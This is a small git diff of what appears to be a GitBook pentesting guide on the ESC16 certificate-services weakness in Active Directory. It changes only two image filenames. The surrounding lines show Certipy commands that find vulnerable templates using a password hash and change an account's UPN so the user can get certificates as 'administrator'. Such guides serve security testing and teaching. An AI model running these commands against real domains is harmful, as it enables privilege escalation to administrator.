@@ -25,7 +25,7 @@ certipy find -u 'user@domain.com' -hashes 'HASH' -dc-ip IP -vulnerable -enabled
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### **Exploitation of ESC16 Vulnerability Using Certipy**
 
@@ -37,7 +37,7 @@ certipy account -u 'USER' -p 'PASS' -target 'DC.domain.com' -dc-ip IP -upn 'admi
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This allows the user to request certificates for the `administrator` identity.
 
